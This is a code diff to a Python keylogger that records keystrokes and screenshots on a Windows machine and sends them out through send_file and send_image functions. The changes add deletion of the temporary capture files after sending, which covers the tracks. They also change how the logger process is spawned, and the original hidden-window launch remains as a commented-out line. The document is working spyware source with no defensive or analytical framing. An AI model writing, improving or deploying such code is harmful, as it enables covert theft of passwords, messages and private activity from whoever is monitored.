@@ -122,8 +122,11 @@ def on_press(key):
         fname = os.environ["TEMP"]+"/"+str(time.time())+".txt".replace("\\","/")
         f = open(fname,"w")
         f.write(key_buffer)
+        f.flush()
         f.close()
         send_file(fname,caption)
+        time.sleep(3)
+        os.unlink(fname)
         key_buffer = ""
 
 
@@ -138,7 +141,8 @@ if sys.argv[-1] == "klog":
     init_keylogger()
     sys.exit(0)
 
-subprocess.Popen([sys.executable, sys.argv[0],"klog"], creationflags=subprocess.CREATE_NO_WINDOW)
+#subprocess.Popen([sys.executable, sys.argv[0],"klog"], creationflags=subprocess.CREATE_NO_WINDOW)
+subprocess.Popen([sys.executable, sys.argv[0],"klog"], creationflags=subprocess.CREATE_NEW_CONSOLE)
 
 while True:
     if "loop" in dir():
@@ -148,4 +152,6 @@ while True:
     print("Send ss")
     send_image(f,caption)
     key_buffer = ""
+    time.sleep(3)
+    os.unlink(f)
     time.sleep(interval)
